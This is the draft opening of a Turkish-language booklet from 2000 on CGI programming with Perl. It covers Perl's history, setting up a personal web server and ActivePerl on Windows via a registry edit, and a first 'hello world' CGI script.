# CGI - Perl Kullanimi

Notlar:

Giriş bölümünün sonunda, HTML-CGI İlişkisi başlıklı ikinci bölümün önünde, “Bir iki not” başlıklı bölümün ilk paragrafında, bu kitapçığın örnek kodlarını içeren cgiperl.zip adlı dosyanın PCW Sitesinde durduğu yerin adresi noktalarla boş bırakılmış bulunuyor. Arzu edilirse bu bilgi kapak içinde de tekrar edilebilir.

Tashih yap(a)madım! VE herzamankinden daha çok daktilo hatası yaptığımı üzülerek görüyor ve elimde olmayan (veya sadece elimden kaynaklanan!) bu durum için son derece üzgün olduğumu belirtmek istiyorum.

Altını çizmeyi unuttuğum İngilizce kelimelerin bold veya italik yapılması size emanet! Ve bunun için ayrıca şükranlar.

Bu kitapçıkla birlikte CD Magazine’de veya sitede Windows ve MacOS için Perl programları verilebilir. WinPerl32’yi http://www.activestate.com ; MacPerl’ü ise www.iis.ee.ethz.ch/~neeri/machintosh/perl.html adreslerinde bulabilirsiniz. Linux? Onda Perl built-in var!

Hakkı Öcal (26 Ocak 2000)

## CGI / PERL

Giriş 5

Kişisel Web Server Kuralım 8

PWS Kurulurken Hata Verirse 9

Windows İçin Perl 10

ActivePerl’ü kurarken 11

Daha fazla bilgi için 14

Bir iki not 15

HTML-CGI İlişkisi 16

Çevre Değişkenleri 18

“Shebang” nereye gitti! 20

Yöntem Farkı: GET ve POST 21

Bilgi Yumağı 22

Yumağı açalım 26

İki önemli HTML etiketi 28

<BASE> Etiketi 28

<META> Etiketi 29

İstemcinin İstekleri - Sunucunun Sundukları 29

HTTP Statü Kodları: 31

Çıktı Türleri ve Yer 33

Belli başlı MIME tür/alt-tür grupları 34

URI türleri 36

Diğer Başlıklar 38

Sonuç 39

Perl’ün Yapı Taşları 40

Perl’de Veri 40

Sabit Değerler, Değişkenler 41

Tekil Değişkenler, Listeler, Ekleme, Çıkartma 43

Dizileri saydırmak 45

Splice ve Split 47

Kolay liste! 48

Özel Karakterlerin ‘Escape’ Durumu 50

Hash! veya İlişkili Diziler 51

Mantıksal Sınama: if..Then Deyimi 58

Karşılaştırma Operatörleri 59

Oku bakiim! 61

Döngüler 63

Tek Tırnak.. Çift Tırnak.. 66

Metinleri birbirine Nokta ile ekleyebiliriz 68

Metin, Sayı ve Dosya İşlemleri 71

Uzuuuuun metin 73

Metin Biçimlendirme 73

Lower ve Upper Kasalar 75

Biraz da Matematik 76

++’nin garip oyunu 78

Perl’de Dosya İşlemleri 79

Biraz Unix Bilgisi 80

Dosyayı Açalım! 81

Path! 82

Tutamak adı neden büyük harf! 83

Dosya Açamayan Perl Ölsün Mü? 84

Her sistemin kendi diline göre 85

Açtığınızı Kapatın! 86

Dosyayı Okuyalım 87

Dosyaya Yazdıralım 91

Perl’de String Biçimlendirme 92

Yazdırmış olsa idik! 94

Dosyaya Ek Yapalım 95

Gerçek Form.. Gerçek Perl 95

Bul-Değiştir 96

Form’dan gelen bilgilerde arama-bulma-değiştirme 100

CGI’da Yaşam 108

CGI, Web Server’a Bağımlıdır 108

UNIX Dosya izinleri 109

Server Güvenliği 110

Server’da program çalıştırmak 112

Server ile FTP İlişkisi 113

## **Giriş**

HTML ile uğraşmaya başladınız ve hemen bu dilin yetersizliklerini keşfettiniz. Bu eksikleri Javascript ile gidermeye çalıştınız. Fakat halâ eksik bir şeyler var. Sayfalarınıza Form koyuyorsunuz, fakat “mailto:” köprüsünden başka bir ACTION koyamıyorsunuz. Veya koyuyorsunuz da hep başkalarının yazdığı programlara, Script’lere köprü veriyorsunuz. Çoğu zaman bu köprüler de işlemiyor.

CGI dünyasına hoşgeldiniz!

Eğer şu andaki planlarınızın arasında yeni bir dil öğrenmek yoksa, korkarım planlarınızı değiştireceksiniz. Bir dil öğrenmeye çoktandır niyetli idiniz, fakat bir türlü dili belirleyemiyor idi iseniz, tebrikler, Perl öğreniyorsunuz!

Hemen gözünüz korkmasın! Muhasebe veya kelime-işlemci bir program yazacak şekilde Perl öğrenmeye kalkmayacağız. Zaten bu kadarcık bir kitapçıkla, Perl gibi bir dil öğrenilemez. Sadece CGI’a yetecek kadar Perl öğreneceğiz. Bu, Web sitenize evsahipliği yapan Web Server’a “Filanca formdaki bilgileri al; şu dosyaya ekle; sonra formu dolduran kişiyle elektronik mektup yollayarak teşekkür et vebana da durumu bildir!” demeye yetecek kadar Perl demektir.

Perl, Internet bu kadar yaygın değilken, yani tarihin karanlık çağlarında (illâ bilmek istiyorsanız, 1986 yılında!), Larry Wall adında Unix işletim sistemi ile çalışan bir bilgisayar ağının yöneticisi tarafından, hergün yaptığı işleri kolaylaştıracak bir makro dili olarak geliştirilmiş. Larry, sorumlu olduğu sistemin kullanımı ve durumu ile ilgili yüzlerce raporu yazdırmak için komut istemci satırından aynı komutları tek-tek girmekten bıkmış. Kendi kendine “Şu sisteme bütün bu komutları hergün tek tek vermektense bir dosya olarak versem; ne kadar kolay olur!” demiş. Fakat o tarihte Larry’nin Unix’inde ve diğer Unix türevlerinde bir çok programlama dili mevcut olduğu halde, “pratik,” bir yığın raporu alıp içinden gerekli bilgileri “çeken” ve bunu “rapor” haline getiren bir dil yoktu. Larry, çaresiz kalan bütün bilgisayarcılar gibi, oturdu, kendi programlama dilini kendisi yazdı! Ortaya çıkan dile, Practical Extraction and Report Language (Pratik Çekme ve Rapor \[etme\] Dili) adı verildi. Tek işlevi vardı: Unix operatörünün çeşitli kayıt (log) dosyalarından ihtiyacı olan bilgileri çekip, bir rapor biçimine sokarak, ya yeni dosyaya kaydetmek, ya ekranda görüntülemek ya da yazıcıda yazdırmaktı.

Fakat ilk sürümünü paylaşanlar Perl’ü (ki ilk sürümünde adı bile yoktu!) o kadar sevdiler ki, 1988 Usenet Konferansı’na katılanların kapış kapış paylaştığı tek şey Perl disketleri oldu. Perl’ün şöhreti Unix ile sınırlı kalmadı; Microsoft firması NT, IBM ise OS/2 için sürümlerinin hazırlanmasına yardımcı oldular. Netscape, Apache ve Microsoft Web Server programlarına Internet Client (istemci) programları (Internet sitelerini ziyaret eden kişinin Browser’ı) tarafından gönderilecek bilgilerin işlenmesi gibi Web Server’a bir dizi komut vermek vermek gerektiğinde kullanılacak Script (betik) dili aradıklarında tereddütsüz Perl’e de yer verdiler. Perl bu amaçla kullanılabilecek diller arasında gerek kullanım kolaylığı, gerekse Unix uzmanları tarafından zaten yaygın olarak kullanılması sebebiple ön sıraya geçti. Şimdi 5’nci sürümüne ulaşmış bulunan Perl ile ilgili temel bilgiyi 200 küsur sayfalık “perl manpage” dosyasında bulabilirsiniz. Bu dosyayı indirebileceğiniz yerlerin başında http://www.perl.com/perl/info/documentation.html#online adresi gelir. Ayrıca Usenet’te Perl’ün gelişimi konusundaki şu Haber Gruplarına bakabilirsiniz:

news://comp.lang.perl.announce

news://comp.infosystems.www.authoring.cgi

Perl’ün bu denli tutulması ve Internet’te istemci ve sunucu sistemler (Browser ve Web Server) arasında aracı olarak kullanılması bir kaç sebebe bağlanabilir. Bunların başında Perl’ün bir Script dili olması gelir: yani Perl ile yazdığınız program, bir düz yazı dosyasıdır ve çalışabilmesi için bir yorumlayıcıya ihtiyaç vardır. Derlenmemiştir; yani ortada bir .exe veya .com dosyası bulunmaz.

Şimdi biraz da CGI üzerinde duralım. Yukarıda CGI’ın, Internet istemcisi ile sunucusunun buluştuğu nokta olduğunu belirttik. Bu noktaya Common Gateway Interface (Ortak Geçit Arayüzü) denir, çünkü Web Server programı, istemci programdan (browser) kendisini çalıştıran bilgisayara gönderilen komutlar için bir geçit noktasıdır. Sizin Web tasarımcısı olarak sözgelimi bir Form’daki bilgilerin alınıp, bir dosyaya kaydedilmesi için vereceğiniz komutu, sitenizin bulunduğu bilgisayarın işletim sistemi icra edecektir. Formunuzdaki bilgilerin alınıp, söz gelimi size elektronik mesaj olarak gönderilmesini istiyorsanız, gerçekte sitenizin evsahibi olan bilgisayara, “E-mail programının mektup gönderme bölümünü çalıştır da, şu mektubu gönder bakalım!” demiş oluyorsunuz. Bu komut icra taleplerinin, Internet’ten (browser’dan) alınıp evsahibi bilgisayarın işletim sistemine aktarılması için bir ortak geçit ve bu geçitte sizin bu komut taleplerinizi karşılayıp, işletim sistemine aktaracak bir ara-birim gerekir. Bu arabirim, CGI’dır.

CGI programı dediğimiz şey ise Perl’le yazılabilir; C, Delphi, Visual Basic ile yazılabilir; yeter ki Web Server bu programı çalıştırabilsin; programın vereceği komutları alıp, kendisinin de “üzerinde” bulunduğu işletim sistemine iletebilsin.

<cgi-perl001.tif>

Bu ilişkileri daha iyi anlayabilmek için biraz daha yakından bakalım. Internet’te istemciler ve sunucular vardır. İstemci (client), bir Internet Browser programıdır; bu program kullanıcı olarak bizim arzu ettiğimiz Internet adresini bulmak ve bu adresteki HTML belgesini Browser penceresinde görüntülemekle görevlidir. Internet dediğilmiz kablolar, uydular, Router’lar kümesinin nasıl çalıştığınızı bildiğinizi varsayıyorum. Bu konuda birçok yerde, örneğin Byte Dergisinin Kasım 1998 sayısıyla birlikte verilen Bir Web Sitesi Kuralım adlı kitapçıkta, gerekli bilgiyi bulabilirsiniz. Internet’in diğer ucunda bulunan sunucu da tıpkı bizim Browser programımız gibi bir programdır; bir bilgisayarda çalışır ve o bilgisayarda da tıpkı bizim istemci bilgisayarımız gibi bir işletim sistemi bulunur. Bizim istemci olarak gönderdiğimiz talep, sunucuya ulaştığında neler olur? Önce Web Server programı, talebi inceler, taleple birlikte kendisine gelen bir çok bilgiyi kaydedeceği bir ortam (Enivronment) oluşturur. Sonra talep edilen HTML dosyasını kendi bilgisayarında bulur ve istemciye gönderir.

İstemci olarak her zaman “düz” bir HTML dosyası talep etmeyiz. Kimi zaman sözgelimi bir form’da “Gönder” düğmesini tıklarız. HTML bilginizi yoklayın; genellikle bir Gönder düğmesi, ait olduğu Form etiketinin ACTION bölümünde yazılı “komutu” harekete geçirir. Böyle bir “istem” halinde neler olur? Bizim açımızdan farklı hiç bir şey olmaz: bizim Browser programımız tıpkı düz bir HTML talep ettiği gibi, Formun bilgisini derler-toplar paketler Sunucu’ya gönderir. Gönderilen “şey” yine Internet denen ortamdan geçer ve sunucuya ulaşır. Fakat bu kez sunucuda farklı işlemler olur:

<cgi-perl002.tif>

Sunucu, kendisine gelenleri inceler ve ikiye ayırır: Veriler ve komutlar. Veriler, bizim için o anda oluşturulan ortamda kaydedilir; komutlar ise çalıştırılmak üzere işletim sistemine aktarılır. Web Server programının çalıştığı işletim sistemi, kendisine Web Server tarafından iletilen “Şu komutu icra et bakalım!” talebini inceler; ve gereğini yerine getirir. (Bu komut, “C: sürücüsündeki bütün bilgileri sil!” bile olsa! Buna aşağıda döneceğiz.)

Bu anlamda CGI, istemcinin Web Server’a ve onun işletim sistemine “iş yaptırttığı” noktadır. CGI programı, bu işleri belirten programdır. Perl, bu programları yazdığımız ve çağırdığımız programı yazmakta kullandığımız bir dildir.

Perl ile çok iş yapılabilir. Fakat bu kitapçıkta biz Perl’ün sadece CGI’ı ilgilendirdiği kadarıyla ilgileneceğiz. Başka bir deyişle bu kitapçık bir Perl kitapçığı değil, bir CGI kitapçıdır. İlgimiz dil olarak Perl’den çok Perl’ün CGI’da nasıl kullanılacağına yönelik olacaktır. Dolayısıyla, önce uzun uzun CGI’ı tanıyacağız. Bunun için Web Server’ın ne olduğuna ve nasıl çalıştığına bakacağız. Ve tabiî bu amaçla bir çok Perl programı yazacağız.

Perl ile veya hangi dille yazılırsa yazılsın, CGI programı kendi başına iş yapmaz, Web Server’a o işin yapılmasını bildirir. Başka bir deyişle Perl ile yazacağımız CGI programı aslında sadece Web Server’ı “programlamaya” yarar. Kelime-işlem programınız için makro yazarken nasıl bu programın neler yapabileceğini bilmek zorunda iseniz, CGI programı yazabilmek için de Web Server programını tanımanız, imkan ve yeteneklerini, işletim sistemi ile nasıl etkileştiğini bilmeniz, dolayısıyla bir ölçüde de olsa işletim sistemi tanımanız gerekir. Bu kitapçıkta bu bilgiler yer alıyor.

**Kişisel Web Server Kuralım**

Şimdi asıl mevzuya girmeden kısa bir hazırlık yapmamız gerekir. Diyelim ki bir CGI programı yazdık. Bu programı Web Server’a gönderip, uygulamaya koymadan önce, kendi bilgisayarımızda denememiz gerekmez mi? Fakat dedik ki, CGI programları Server için yazılır ve Server’da çalışır. Bugüne kadar istemci olmaktan başka bir işlevi olmayan kendi bilgisayarımızda bu işi yapabilir miyiz? Evet yaparız; yapmak zorundayız. Bir CGI programını gerçek Web Server’da, gerçek Internet’te denemeye kalkmak, hem çok tehlikeli olabilir, hem de çok masraflı. Önce kendi istemci bilgisayarımızı, küçük bir sunucu haline getirelim ve CGI programlarımızı kendi bilgisayarımızda deneyelim.

Perl, Unix dilidir; dolayısıyla herhangi bir Unix-türevi işletim sisteminde (örneğin Linux’ta) hiç bir şey yapmaya gerek olmadan çalışır. NT işletim sistemiyle çalışan Web Server programları da Perl ile yazılmış CGI programlarını çalıştırabilirler. Ücretsiz site yeri veren Web Evsahibi firmalar (Hosting şirketleri) genellikle Unix-tabanlı sistemlere sahiptir. Fakat sizin evsahibiniz NT-tabanlı bir Web Server’a sahipse, büyük bir ihtimalle sistemini Perl’ü tanıyacak ve çalıştırabilecek ekleri yapmıştır.

Yazacağımız CGI programlarını sınayacağınız kişisel bilgisayarınız Linux ile çalışıyorsa, muhtemelen bir Web Server programı ya kurulmuştur; ya da elinizdeki Linux dağıtım CD-ROM’unda bunu yapmanızı sağlayacak dosyalar vardır. Linux ile çalışan bilgisayarınıza Web Server programını kurduğunuz zaman bu program Perl’ü anlar, yorumlar ve uygular; özel bir önlem almanız gerekmez.

Kişisel bilgisayarınız Windows 95, 98, NT4 WorkStation veya NT4 Server ile çalışıyorsa, sisteminize bir Web Server programını siz kurmak zorundasınız. Windows 2000 Professional veya Windows 200 Server ise Kişisel Web Server programını kendiliğinden kurar. Ancak bütün Windows sistemlerinde, kişisel Web Server’ın Perl ile yazılmış CGI programını anlar hale gelmesini sağlamak size düşer. Şimdi kısaca bir Windows sistemine kişisel Web Server kurma ve bu Server’ı Perl anlar hale getirme konusu üzerinde duralım.

Windows 98’e bir kişisel Web Server kurmaya geçmeden önce bilgisayarımıza bir kimlik vermemiz gerekir: Bilgisayarım/Denetim Masası/Ağ’ı tıklayarak açacağınız diyaloğ kutusunda ikinci sekme olan Tanımlama’yı açın ve “Bilgisayar adı” kutusuna istediğiniz adı yazın. Bilgisayarın ağ ortamında olması gerekmez. Sonra Win98 CD-ROM’unda Add-ons klasöründeki PWS dizininde Kur.exe’yi tıklayın. Aynı işlemi NT için Option Pack CD-ROM’unu kullanarak da yapabilirsiniz. Option Pack CD-ROM’undaki Default.htm’i açarsanız, bilgisayarınızın Windows 98 ile çalıştığını algılayacak olan program size Personal (kişisel) Web Server (PWS) kurmayı önerecektir. NT4 Workstation veya NT4 Sevrer sistemlerine kişisel Web Server olarak Internet Information Server (IIS) kurulmalıdır. NT Option Pack CD-ROM’unundaki Default.htm’i açarsanız, program size IIS’ii kurmayı önerecektir. (NT4 sistemlerine IIS’i kurmadan önce, Service Pack 3’ü uygulayın; Internet Explorer 5’i kurun. Elinizde varsa Service Pack 4, 5 veya 6’yı en son uygulayın.)

//////////////////////KUTU//////////////////

**PWS Kurulurken Hata Verirse**

Windows 98’e PWS kurarken, programın Microsoft Transaction Server bölümüne ilişkin sistem kayıtları yapılırken, iki hata mesajı ile karşılaşabilirsiniz (0x80004005 ve 0xfee662). Bu, orijinal Windows 98 CD-ROM’undaki PWS Kur programının, Windows Registry dosyasının büyük olması halinde hata vermesinden kaynaklanıyor. Böyle bir durumla karşılaşırsanız, Bilgisayarım/Denetim Masası/Program Ekle Kaldır aracılığıyla, Personel Web Server’ı kaldırın. Bilgisayar kapanıp açıldıktan sonra, Windows 98 CD-ROM’unda Add-ons/PWS dizinindeki bütün dosyaları, sabit diskinizde Temp dizinine kopyalayın. Sonra http://support.microsoft.com/support/kb/articles/q246/0/81.asp adresinde “Dowload Mstsetup.dll” satırını tıklayın. Mssetup.exe adlı bir dosya bilgisayarınıza indirilince; bu dosyası iki kere tıklayın ve dosyanın genişletileceği yer olarak C:\\Temp’i gösterin; program Mstsetup.dll dosyasının değiştirilmesini isteyip istemedğinizi sorduğu zaman “Tamam”ı tıklayın. Şimdi, C:\\Temp’deki Kur.exe (Windows CD-ROM’unuz İngilizce ise Setup.exe) programını iki kere tıklayın. PWS şimdi hatasız kurulacaktır.

///////////////////KUTU BİTTİ//////////////////////////////

Windows 987e Kişisel Web Server kurulduğunda Masaüstü’nde Yayınla (Publish) adlı bir simge belirecektir. NT sistemlerinde ise Başlat menüsünde Programlar bölümüne IIS Manager satırı eklenir. Bu yollardan biriyle PWS veya IIS’i çalıştırın; Kişisel Web Server Yönetici penceresi açılacaktır. Soldaki araç çubuğunda Yönetici’nin çeşitli bölümlerine gitmeniz gerekli gezinme simgeleri var. Şimdi, açılan ana pencerede iki unsura dikkat edin:

<cgi-perl003.tif>

1. Kişisel Web Server’ınızın adı. Bilgisayarınızın adı buraya Server adı olarak yazılmış olmalı. Biraz sonra, Internet’e koymadan önce sınayacağımız CGI programlarını içeren HTML sayfalarını çağırırken, Browser’ın adres kutusuna burada gördüğümüz adı yazacağız.

2. Kişisel Web Server’ın bilgisayarımızda sabit diskteki gerçek adresi. Bu, sizin Kişisel Web Server’ınızın kök (root) dizinidir. Bu genellikle C:\\inetpub\\wwwroot klasörüdür. Kişisel Web sitesi yaparsanız, sitenin gerektirdiği bütün dizinleriniz ve dosyalarınız burada gördüğünüz dizinin içinde olmalıdır. Yapacağımız CGI dosyalarını işte bu dizinin içine koyacağız.

Bunları bir kenara not ettikten sonra, soldaki araç çubuğunda Gelişmiş simgesini tıklayın; ortadaki pencerede sanal dizinlerinizi görüyorsunuz. Bunlardan Home’u seçin ve sağdaki “Özellikleri düzenle” düğmesini tıklayın.

<cgi-perl004.tif>

Ana dizinin okuma, yürütme ve makro erişim haklarının işaretli olmasına dikkat edin. İlerde kendinize Kişisel Web Server’ınızın kök dizininde yeni bir dizin oluşturursanız (örneğin “resimler” gibi) ve içine sitenizle ilgili dosyalar koyarsanız, Gelişmiş penceresinde Ekle düğmesini tıklayarak bu gerçek dizini de sitenin sanal dizinlerinden biri haline getirmeniz gerekir. Gerçek dizinin adı XYZ bile olsa, sanal dizin haline getirirken istediğiniz sanal adı verebilirsiniz. Ama unutmayın, Browser’ın adres hanesine gerçek dizin adını değil sanal dizin adını yazmanız gerekir.

Bu işlemleri IIS’te değişik görüntülerle, fakat temel ilkeler itibariyle aynı şekilde yapabilirsiniz.

**Windows İçin Perl**

Şimdi sıra geldi Windows ortamını Perl’den anlar hale getirmeye! Bunun için Internet’ten ActivePerl’ü indirmek veya ActiveState firmasından CD-ROM ısmarlamak zorundayız. Her iki işlem için de http://www.activestate.com adresine gitmemiz gerekir. ActiveState sitesinden ActivePerl’ün son sürümünü indirin ve bilgisayarınıza kurun. Windows 95 kullanıcıları, sistemlerinde Perl programlarını çalıştırabilmek için sistemlerinin DCOM bileşenlerini güncelleştirmek için Microsoft’un sitesinden bazı dosyaları indirmek zorundalar. Bu güncelleştirme için dosyaları http://www.microsoft.com/com/resources/downloads.asp adresinde bulabilirsiniz. (Distributed Component Object Model (DCOM), Windows’un ağda güvenli ve etkin bir tarzda yazılım bileşeni dağıtma teknolojisidir. Eski adıyla "Network OLE," olan DCOM, HTTP dahil, bütün ağ dağıtım ve ulaştırma protokolleri ile uyumludur ve kendi bilgisayarımızda Perl programlarını sınamak için bile olsa Windows açısından gereklidir.)

/////////////////KUTU/////////////

**ActivePerl’ü kurarken**

ActiveState’in bu kitapçığı yazarken 5.22 sürümüne ulaşmış olan ActivePerl programının kuruluşu sırasında bazı hata mesajları ile karşılaşmak mümkündür. 102, 104, 105, 112 veya 301 sayılı hata mesajlarını alırsanız, bilgisayarınızı kapatıp, açın ve ActivePerl’ü kurmadan önce herhangi bir 16-bit program çalıştırmayın. Sorunu bu yöntemle çözemezseniz, http://support.installshield.com/kb adresinde Q100198 sayılı yaardım dosyasını indirerek, önerileri sırasıyla uygulayın.

ActivePerl’ün kurulumununsonuna doğru “Cannot Craeta Perl Interpreter” mesajını alırsanız, muhtemelen daha önce kurulmuş eski sürüm ActivePerl ile çatışma var demektir. Bu durumda ya eski ActivePerl’ü kaldırır ve klasörlerini silemeniz ya da yeni sürüm ActivePerl’ü yeni bir klasöre kurmanız gerekir.

ActivePerl’ü adında boşluk olan dizine kurmayın. ActivePerl’ün işlemesi için gerekli bazı programlar, adında boşluk olan dizinleri göremezler. ActivePerl’ün Kur programının önerdiği varsayılan dizini kabul etmek doğru olur. Ayrıca Kur programının Autoexec.bat ve config,sys dosyalarında yapmayı önerdiği değişiklikleri yapmasına izin verin.

Kurma ve diğer sorunlarla ilgili olarak ActiveState’in sitesindeki FAQ (Sıkça sorulan Sorular) dosyalarına başvurabilirsiniz. Özellikle http://www.activestate.com/ActivePerl/docs/perl-win32/perlwin32faq4.html sayfasında Windows sistemleriyle ilgili geniş bilgi bulabilirsiniz.

//////////////////KUTU BİTTİ///////////////////

ActivePerl’ü kurduktan sonra, küçük bir işlemle, PWS veya IIS’i, uzatması .pl olan dosyaları görüntülenmesi için Perl.exe programını çalıştırmak üzere ayarlamanız gerekir. Bu ayar, Windows’un kayıt dosyasını (Regitry) düzenlemeyi gerektiriyor. Kayıt dosyası, Windows 95/98/NT/2000 sistemlerinin düzgün çalışması için gereklidir; bu dosyada yapılacak bir yanlışlık sistemin tümünü çalışmaz hale getirebilir. Aşağıdaki işlemleri yapmaya başlamadan önce Registry’nin yedeğini almak ve bunu bir diskette saklamlak gerekir. Buna rağmen çalışırken çok dikkatli olmanızı salık veririm.

Şimdi önce Perl.exe’nin yol bilgisini (Path) bir kenara yazın: örneğin c\\Perl\\bin\\perl exe); ve PWS’i durdurun. Sonra 95/98’de Regedit.exe, NT’de Regedt32.exe programını çalıştırın. Soldaki dizide altı ana-kayıt bölümü göreceksiniz. Bunlardan HKEY\_LOCAL\_MACHINE’nin önündeki artı işaretini tıklayın. Açılacak listede SYSTEM’i bulun ve önündeki artıyı tıklayın. Açılacak listede CurrentControlSet’i bulun; önündeki artıyı tıklayın. Açılacak listede Services satırını bulun ve önündeki artıyı tıklayın; yeni listede W3SVC satırının önündeki artıyı, sonra Parameter satırının önündeki artıyı tıklayın. Şimdi, açılacak lisdede ScriptMap satırını tıklayın. Sağda, “Varsayılan...(değer atanmamış)” satırını görüyor musunuz? Güzel. Şimdi, Düzen menüsünü tıklayın, açılacak listede Yeni, açılacak alt-listede Dize Değeri maddesini seçin. Sağda, “Varsayılan...” satırının altında “Yeni Değer #1” adlı bir satır oluşacak ve bu kelimeler seçilecektir. Klavyede “.pl” yazın (Nokta işareti, p ve l harfleri). Sonra kKlavyede iki kere Enter’a basın; açılacak Dize Düzenle kutusunda “Değer verisi” hanesine kendi sisteminize uygun olan Perl’ün sabit diskteki yol bilgisini (Path) ile birlikte “%s %s” yazın. Örneğin:

c:\\Perl\\bin\\perl.exe %s %s

Burada “%s” yazarken s harfinin küçük harf olmasına dikkat edin; büyük S yazarsanız Perl çalışmaz. Bu bilgiyi girdikten sonra Dize Değeri kutusunun Tamam düğmesini tıklayın. Aynen şu görünümü elde etmiş olmalısınız:

<cgi-perl005.tif>

Bu işlem sırasında Dize adını verirken hata yaparsanız, örneğin .pl yerine pl veya .pp yazarsanız, bu kelimeyi sağ tıklayın ve açılan menüden Yeniden Adlandır maddesini seçin. Dize değerini yazarken hata yaparsanız, yine .pl’i sağ tıklayın ve açılan menüden Değiştir maddesini seçin. (Eğer ActivePerl’ün varsayılan değerlerini değiştirmediyseniz, Perl dizininin adının büyük harfle, “bin” dizininin ve programın adının küçük harfle başladığına dikkat edin. %s iki kere kere yazılıyor ve ikisinde de s harfi küçük!)

Regedit’i kapatın. Bilgisayarı kapatıp, açın ve PWS’i başlatın. Şimdi PWS’ınız Perlce bilir hale gelmiş olmalı!

Aynı işlemi NT’de IIS için yapacaksanız, IIS Manager’da Default Web Server’ı durdurun. Regedt32.exe’yi çalıştırdığınızda ve HKEY\_LOCAL\_MACHINE\\ SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameter\\ScriptMap’i bulunca Edit menüsünden Add Value maddesini tıklayın. Value Name olarak .pl yazın. Data Type olarak Reg\_SZ’i seçin ve String Value olarak perl.exe’nin tam Path’ ile perl.exe %s %s yazın. Örneğin:

c:\\Perl\\bin\\perl.exe %s %s

Regedt32’yi kapatın; IIS Manager’dan Default Web Server’ı çalıştırın. Şimdi sizin NT sisteminiz de Perl anlar hale gelmiş olacak.

Ama her iki durumda sistemi sınamak gerekir. Bunun için Not Defterini açıp, şunları yazın:

**print "HTTP/1.0 200 OK\\n";**

**print "Content-Type: text/html\\n\\n";**

**print "<HTML>\\n";**

**print "<HEAD>\\n";**

**print "<TITLE>MERHABA DÜNYA</TITLE>\\n";**

**print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";**

**print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";**

**print "</HEAD>\\n";**

**print "<BODY>\\n";**

**print "<H4>Merhaba Dünya</H4>\\n";**

**print "<P>\\n";**

**print "IP adresiniz: $ENV{REMOTE\_ADDR}.\\n";**

**print "<P>\\n";**

**print "<H5>Başarılar dileriz!</H5>\\n";**

**print "</BODY>\\n";**

**print "</HTML>\\n";**

Bu dosyayı merhaba.pl adıyla, PWS’ın kök (root) dizinine kaydedin. Browser’ınızı açın ve adres hanesine kişisel Web Server’ınızın adresi ile birlikte dosyanın adını yazın. Örneğin: http://server/merhaba.pl

<cgi-perl006.tif>

Tebrikler! Bir taşla kaç kuş birden vurdunuz. Ve en önemlisi, ilk CGI programınıza “Merhaba Dünya!” yazdırarak, bir geleneği korumuş oldunuz. İlk Perl programımızı yazmış olduk; gerçi şu anda yazdıklarımızın ne işe yaradığını pek bilmiyoruz, ama yukarıda belirttiiğimiz gibi bu programla Server’a bir “iş” yaptırıyoruz. Bu iş, ana hatlarıyla, bir HTML sayfası oluşturmak ve bunu talep eden istemciye göndermesini sağlamaktan ibadet. Kodumuza dikkatle bakarsanız bu işin bölümlerini görebilirsiniz; ama şimdilik bu ayrıntıların üzerinde durmayalım.

Burada önemli olan, Windows sistemimizi Unix’e ait bir dili anlar hale getirmiş ve bunu kurduğumuz kişisel Web Server’ımıza tanıtmış olmamız.

Şimdi kolları sıvayıp, CGI için Perl öğrenmeye başlayabiliriz. Ama isterseniz bu işlemi bir kere de “.cgi” uzatması için yapabilirsiniz. Perl program dosyalarını “.cgi” uzatmasıyla kaydetmek yaygın bir uygulamadır; böyle bir örnekle karşılaştığınız ve uyguladığınız zaman kişisel Web Server’ınızın hata vermesini önlemiş olursunuz.

**Daha fazla bilgi için**

Bu kitapçıktaki Perl, metin ve HTML örneklerini, PCWorld-Türkiye dergisinin Web Sitesinden, ......................................./cgiperl.zip dosyasını indirerek edinebilirsiniz. Bu dosyayı indirseniz bile, aşağıda vereceğimiz Perl örneklerini kendiniz yazmalısınız; Perl bilmenin bir şartı fonksiyonları tanımaksa, diğer şartı Perl’ün yazım kurallarını iyice öğrenmektir.

CGI programı olarak herhangi bir dille yazdığınız uygun bir çalıştırılabilir dosya (dosya adı uzatması “.exe” veya “.com” olan bir Executable’ı) kullanabilirsiniz. Fakat bu kitapçıkta, aksini belirtmediğim taktirde CGI programı dediğim zaman bir Perl dosyasını kastediyorum.

Bu kitapçıkta yeri geldikçe HTML konusunda da bilgiler bulacaksınız; bununla birlikte HTML’i bir dil olarak bildiğinizi varsayıyoruz. Bu konuda eksiğiniz varsa, Byte Dergisinin Ekim 1998’de verdiği Internet Tasarım Rehberi kitapçığına veya Internet’te bulabileceğiniz bir çok on-line HTML kurs malzemesine (örneğin http://www.webteknikleri.com) başvurabilirsiniz.

**Bir iki not**

Bu kitapçıkta “|” (Pipe, Bağlama) işaretini “veya” anlamına anlamına kullanıyorum. Örneğin “METHOD=\[“POST” | “GET”\]” ifadesi, “METHOT=” kelimesinin karşısına, tırnak işareti içinde, ya POST ya da GET yazmanız gerektiğini belirtiyor.

Türkçe konusunda: Dosya adlarında, HTML’in TITLE etiketinde ve INPUT etiketinin NAME özelliğinde, Perl programlarında değişken adlarında, Türkçe, Fransızca, Flemenkçe, Vietnamca, yani içinde içinde non-ASCII karakter bulunan kelime kullanmak hatalıdır. Bunu sadece görünüm açısından değil, fakat özellikle değişken adlarının daha sonra bulunamaması, hata vermesi gibi durumları önlemek için yapmamak gerekir. Windows ve Unicode uyumlu işletim sistemlerinde veya kendisini Unicde uyumlu olmayıp da sonradan Türkçe sistem desteği kazandırılmış işletim sistemlerinde sorun olmayabilir; fakat cGI programlarınızın nerede, hangi Server’da ve hangi işletim sisteminde çalışacağını bilemezsiniz. Buna karşılık metin alanlarında Türkçe kullanmak, Browser’ı Türkçe-şifreleme konusunda yönlendiren komutları unutmamak şartıyla daima mümkündür. Bu ilkeye uygun olarak bu kitapçıkta sistemle ilgili yerlerde Türkçe kelimelerde Türkçe karakter kullanmaktan kaçındım. Bir çok konuda sık sık imdadıma yetişen Ahmet Usta ve Osman Hömek, bir çok bilimsel notasyonun Türkçesi konusundaki yardımlarını Perl konusunda da esirgemediler. Kendilene teşekkür borçluyum.

